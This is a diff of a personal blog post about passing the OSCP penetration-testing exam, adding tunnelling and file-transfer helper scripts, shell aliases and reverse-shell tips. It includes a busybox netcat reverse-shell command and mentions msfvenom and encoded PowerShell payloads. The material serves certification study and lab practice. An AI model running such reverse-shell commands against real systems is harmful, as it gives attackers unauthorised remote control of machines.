@@ -6,7 +6,7 @@ image: https://i.ytimg.com/vi/qqGb25h-5Y8/maxresdefault.jpg
 featured: true
 title: How I Passed the OSCP
 date: 2024-09-18T18:38:38.550Z
-lastmod: 2024-09-20T16:41:11.049Z
+lastmod: 2024-09-20T19:09:22.971Z
 ---
 I passed the OSCP just six months into my cybersecurity journey, despite having limited prior experience.\
 Before this, I had mainly worked with MERN Stack Web Development and experimented with Arch Linux and was fully immersed in all things Linux.
@@ -110,20 +110,87 @@ Whenever you are hacking a machine don't be afraid to lookup hints, it's always 
 
 The main tip I would like to give is anything you find even slightly suspicious search about it on [HackTricks](https://book.hacktricks.xyz/). It is a great resource and helped me immensely to pass the exam.
 
-### Reverse Shells
+## Custom Scripts
+
+One thing that often gets overlooked is the power of scripts. Writing a Bash or Python script for repetitive tasks might seem like a hassle, but it pays off quickly. Automating frequent actions not only saves time but also saves you from frustration, helping you work more efficiently.
+
+Below are a few scripts I’ve made to streamline my workflow. They're not perfect, but they’ve saved me a lot of time. Feel free to take inspiration and adapt them to suit your needs.
+
+Check out my [github repo](https://github.com/AdityaHebballe/Pentest-Scripts) for installation instructions for all of them. Any suggestions are welcome
+
+### Proxify.sh
+
+This is a script I created after frequently digging through my notes to find tunneling commands.
+
+This script simplifies tunneling by displaying the necessary commands and automatically starting a Python server. It also provides the commands for transferring Chisel or Ligolo binaries to the target, based on user selection.
+
+Here's an example of the script in action. I specified **linux** target (`l`) and with **chisel**(`c`)
+
+![How I Passed the OSCP\_1.png](/postimgs/Images/How%20I%20Passed%20the%20OSCP_1.png)
+
+### Transfile.sh
+
+This is a script I made to make file transfer easier, it displays the commands to transfer files to the target upon providing the filename and target OS.
+
+Here in this example I am transferring **winPEAS.exe** to a **windows** target.
+
+![How I Passed the OSCP\_2.png](/postimgs/Images/How%20I%20Passed%20the%20OSCP_2.png)
+
+### Oh-my-posh
+
+This is a customization for my oh-my-posh config that displays the tun0 IP address directly in the terminal, saving me from typing `ifconfig` repeatedly.
+
+![How I Passed the OSCP\_3.png](/postimgs/Images/How%20I%20Passed%20the%20OSCP_3.png)
+
+Useful for msfvenom payloads, etc .
+
+### Aliases
+
+Aliases let you streamline your most frequently used commands, making them quicker to type.
+
+Add these to you `~/.zshrc` (or the config to whatever shell you use ).
+
+* Use exa to make `ls` prettier and with icons for better readability
+
+```
+alias ls='exa --icons'
+```
+
+![How I Passed the OSCP\_5.png](/postimgs/Images/How%20I%20Passed%20the%20OSCP_5.png)\
+\==Colorful!==
+
+* Zoxide enhances your terminal navigation by intelligently tracking your directory usage, allowing for faster and more efficient access to frequently visited directories with minimal typing. I recommend watching this [video](https://www.youtube.com/watch?v=aghxkpyRVDY) on how it does that
+
+```
+ alias cd='z'
+```
+
+* pen is easier to type than penelope.py and I use this listener the most.
+
+```
+pen='/home/kali/Documents/penelope/penelope.py'
+```
+
+## Reverse Shells
 
 For reverse shells use [revshells.com](https://www.revshells.com/) for both windows and Linux
 
-For Linux reverse shells try using busybox first as I found that to be the most reliable:
+For **Linux** reverse shells try using busybox first as I found that to be the most reliable:
 
 ```bash
 busybox nc <ip> <port> -e sh
 ```
 
-For Windows try the Powershell Base64 encoded from revshells.com
+For listener use [penelope.py](https://github.com/brightio/penelope) as it automatically upgrades your shell upon receiving a connection.
+
+![How I Passed the OSCP\_4.png](/postimgs/Images/How%20I%20Passed%20the%20OSCP_4.png)
+
+For **Windows** try the Powershell Base64 encoded from revshells.com
 
 And note that you can use the same reverse shell (for example reverse.exe you generated using msfvenom) multiple times.\
 Once a reverse shell is connected you can start a listener again and connect to the same port once again.
+
+Use prepend *rlwrap* before netcat command so that you can navigate the terminal better.
 
 ## Windows Privilege Escalation
 
